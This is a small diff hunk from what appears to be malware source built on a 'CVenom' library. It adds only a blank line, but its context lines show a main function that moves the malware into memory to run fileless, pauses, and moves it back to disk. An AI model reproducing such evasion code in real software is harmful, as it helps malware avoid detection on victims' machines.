@@ -31,6 +31,7 @@ int main(int argc, char** argv){
          Evador.MoveIntoMemory();                              // Used To Move The Malware From The Hard Disk To The RAM (Used To Create Fileless Malwares).
          Runner.Sleep(5);                                      // Pause The Malware For 5 Seconds
          Evador.MoveBackToDisk();                              // Move The Malware From Memory Back To Disk (Not Required Because The cvexit() Function is going to Check if the malware is On the disk Or Not, Then Move It Back From Memory Into Disk.
+         
          cvexit(0);                                            // Freeing CVenom's Memory, Should Be Always Inserted in the end of the main function with the exit code.
 
 
